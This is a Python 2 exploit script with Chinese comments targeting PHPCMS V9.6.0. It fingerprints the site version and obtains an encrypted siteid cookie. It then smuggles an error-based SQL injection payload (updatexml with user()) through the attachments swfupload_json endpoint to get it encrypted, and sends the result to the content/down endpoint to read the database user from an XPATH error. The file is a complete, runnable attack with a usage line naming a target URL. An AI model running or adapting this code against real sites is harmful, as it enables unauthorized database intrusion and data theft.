#coding=utf-8
import sys
import requests
import re 
import urllib

def message():
	print ("[*]usage:python %s http://www.lioneijonson.cn" % sys.argv[0])

# 判断是否为 PHPCMS
def is_PHPCMS():
	power = ""
	version = ""
	content = requests.get(sys.argv[1]).text
	match = re.search(r"Powered by (.*)>(.*)</a></strong> <em>(\S+)</em>", content)
	if match:
		power = match.group(2)
		version = match.group(3)
	if power.lower()!='phpcms' and version!='V9.6.0':
		print "[!]非对应版本框架或版本号"
		sys.exit(0)

# 获取加密cookie
def get_cookie():
	global userid
	url = sys.argv[1] + "/index.php"
	get_params = {
		'm':'wap',
		'c':'index',
		'siteid':'1',
	}
	content = requests.get(url, params=get_params)
	for cookie in content.cookies:
		if '_siteid' in cookie.name:
			userid = cookie.value

# 将payload与cookie混合
def put_payload():
	global attack_payload
	url = sys.argv[1] + "/index.php"
	payload = '&id=%*27 and updatexml(1,concat(1,(user())),1)#&m=1&modelid=2&f=test&catid=7&'
	url = url + '?m=attachment&c=attachments&a=swfupload_json&aid=1&src=' + urllib.quote(payload)
	data = {'userid_flash': userid}
	content = requests.post(url, data=data)
	for cookie in content.cookies:
		if '_att_json' in cookie.name:
			attack_payload = cookie.value

# 解码攻击载荷
def get_payload_result():
	url = sys.argv[1] + "/index.php"
	get_params = {
		'm':'content',
		'c':'down',
		'a_k':attack_payload
	}
	respon = requests.get(url, params=get_params)
	match = re.search(r"XPATH syntax error: '(\S+)'", respon.content)
	if match:
		print match.group(1)

if __name__ == '__main__':
	if len(sys.argv) != 2:
		message()
		sys.exit(0)
	is_PHPCMS()
	get_cookie()
	put_payload()
	get_payload_result()